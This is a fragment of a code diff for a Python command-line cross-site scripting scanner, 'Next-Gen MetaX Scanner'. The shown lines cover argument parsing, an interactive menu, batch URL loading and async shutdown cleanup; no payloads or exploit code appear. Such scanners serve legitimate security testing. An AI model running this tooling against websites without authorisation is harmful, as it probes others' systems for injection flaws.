+                    for i,url in enumerate(urls,1):
+                        if shutdown.is_set():break
+                        url=url if url.startswith('http') else f"http://{url}"
+                        await manager.run(url)
+                        if i<len(urls):await manager.reset()
+            except FileNotFoundError:
+                console.print(f'[red]File not found: {args.file}[/red]')
+    except asyncio.CancelledError:
+        handle_shutdown()
+    finally:
+        if manager and manager.pool:await manager.pool.shutdown()
+        if client:await client.aclose()
+        if browser:await browser.close()
+        if playwright:await playwright.stop()
+        console.print('[green]Shutdown complete[/green]')
 
-def parse_args() -> argparse.Namespace:
-    parser = argparse.ArgumentParser("Next-Gen MetaX Scanner - Advanced Edition")
-    parser.add_argument("-u", "--url", help="Single URL to scan")
-    parser.add_argument("-f", "--file", help="File with URLs (one per line)")
-    parser.add_argument("-b", "--browser", action="store_false", help="Disable browser verification")
-    parser.add_argument("-o", "--output", help="Output JSON file path")
-    parser.add_argument("-m", "--mode", choices=["quick", "deep", "comprehensive"],
-                        default=CF.get("scan_mode"), help="Select scanning mode")
-    return parser.parse_args()
-
-def main() -> None:
-    args = parse_args()
-    CF["scan_mode"] = args.mode
-    urls: List[str] = []
-    if args.url:
-        if validators.url(args.url) and is_interesting(args.url):
-            urls.append(args.url)
-        else:
-            console.print("[error]Invalid or uninteresting URL.[/error]")
-    if args.file and os.path.isfile(args.file):
-        with open(args.file, "r", encoding="utf-8") as f:
-            urls.extend({l.strip() for l in f if validators.url(l.strip()) and is_interesting(l.strip())})
-    if urls:
-        asyncio.run(XSSScanner().run_scan(urls, use_browser=args.browser, out_file=args.output))
-        sys.exit(0)
-    state = {"browser_verify": True}
-    while True:
-        console.clear()
-        console.print("[highlight]=== Next-Gen MetaX Scanner ===[/highlight]")
-        menu = ("[info]1.[/info] Single URL\n[info]2.[/info] Batch File\n[info]3.[/info] Toggle Browser Verification (current: " +
-                str(state['browser_verify']) + ")\n[info]4.[/info] Exit")
-        console.print(menu)
-        choice = Prompt.ask("[step]Select Option[/step]", choices=["1", "2", "3", "4"], default="1")
-        if choice == "1":
-            u = Prompt.ask("[info]Enter a URL[/info]").strip()
-            if not validators.url(u):
-                console.print("[error]Invalid URL.[/error]")
-                continue
-            if not is_interesting(u):
-                console.print("[warning]URL appears static.[/warning]")
-            asyncio.run(XSSScanner().run_scan([u], use_browser=state["browser_verify"]))
-            Prompt.ask("Press Enter to continue...")
-        elif choice == "2":
-            fp = Prompt.ask("[info]Enter file path[/info]").strip()
-            if not os.path.isfile(fp):
-                console.print("[error]File not found![/error]")
-                continue
-            with open(fp, "r", encoding="utf-8") as f:
-                urls = {l.strip() for l in f if validators.url(l.strip()) and is_interesting(l.strip())}
-            if not urls:
-                console.print("[error]No valid URLs found.[/error]")
-                continue
-            asyncio.run(XSSScanner().run_scan(list(urls), use_browser=state["browser_verify"]))
-            Prompt.ask("Press Enter to continue...")
-        elif choice == "3":
-            state["browser_verify"] = not state["browser_verify"]
-            console.print(f"[info]Browser verification set to: {state['browser_verify']}[/info]")
-        else:
-            console.print("[success]Exiting. Stay safe![/success]")
-            break
-
-if __name__ == "__main__":
-    main()
+if __name__=='__main__':
+    if sys.version_info<(3,8):
+        console.print('[red]Requires Python 3.8+[/red]')
+        sys.exit(1)
+    try:
+        asyncio.run(main())
+    except KeyboardInterrupt:
+        console.print('\n[red]Forced exit[/red]')
